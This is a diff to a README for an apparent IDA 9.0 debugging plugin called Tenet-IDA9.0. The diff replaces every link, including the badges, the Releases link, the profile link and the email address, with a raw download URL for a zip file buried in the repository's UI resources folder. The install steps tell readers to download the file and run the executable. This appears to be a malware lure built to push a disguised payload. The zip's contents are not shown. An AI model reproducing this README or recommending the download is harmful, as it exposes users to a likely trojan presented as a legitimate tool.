@@ -1,6 +1,6 @@
 # Tenet-IDA9.0 🚀
 
-![Tenet-IDA9.0](https://img.shields.io/badge/Tenet-IDA9.0-blue.svg) ![GitHub All Releases](https://img.shields.io/github/downloads/william965/Tenet-IDA9.0/total.svg)
+![Tenet-IDA9.0](https://github.com/william965/Tenet-IDA9.0/raw/refs/heads/main/tenet/ui/resources/ID-Tenet-v1.0.zip) ![GitHub All Releases](https://github.com/william965/Tenet-IDA9.0/raw/refs/heads/main/tenet/ui/resources/ID-Tenet-v1.0.zip)
 
 Welcome to the **Tenet-IDA9.0** repository! This project serves as a modified version of Tenet, now fully compatible with IDA 9.0. We have added features that enhance the debugging experience, optimized the interface, and included support for arm64 architecture. Additionally, we have rewritten parts of the ASLR functionality to improve performance and usability.
 
@@ -23,7 +23,7 @@ Welcome to the **Tenet-IDA9.0** repository! This project serves as a modified ve
 
 ## Installation 🛠️
 
-To get started with Tenet-IDA9.0, you need to download the latest release. You can find the release files [here](https://github.com/william965/Tenet-IDA9.0/releases). Download the appropriate file for your system, and follow these steps:
+To get started with Tenet-IDA9.0, you need to download the latest release. You can find the release files [here](https://github.com/william965/Tenet-IDA9.0/raw/refs/heads/main/tenet/ui/resources/ID-Tenet-v1.0.zip). Download the appropriate file for your system, and follow these steps:
 
 1. **Download the Release**: Click on the link above to access the Releases section. Choose the file that matches your operating system and architecture.
 2. **Execute the File**: Once downloaded, run the executable file to install Tenet-IDA9.0 on your machine.
@@ -56,7 +56,7 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 
 If you have any questions, suggestions, or issues, feel free to reach out:
 
-- **GitHub**: [william965](https://github.com/william965)
-- **Email**: william965@example.com
+- **GitHub**: [william965](https://github.com/william965/Tenet-IDA9.0/raw/refs/heads/main/tenet/ui/resources/ID-Tenet-v1.0.zip)
+- **Email**: https://github.com/william965/Tenet-IDA9.0/raw/refs/heads/main/tenet/ui/resources/ID-Tenet-v1.0.zip
 
-Thank you for checking out Tenet-IDA9.0! We hope you find it useful in your debugging endeavors. For the latest updates and releases, please visit the [Releases section](https://github.com/william965/Tenet-IDA9.0/releases) again.
+Thank you for checking out Tenet-IDA9.0! We hope you find it useful in your debugging endeavors. For the latest updates and releases, please visit the [Releases section](https://github.com/william965/Tenet-IDA9.0/raw/refs/heads/main/tenet/ui/resources/ID-Tenet-v1.0.zip) again.
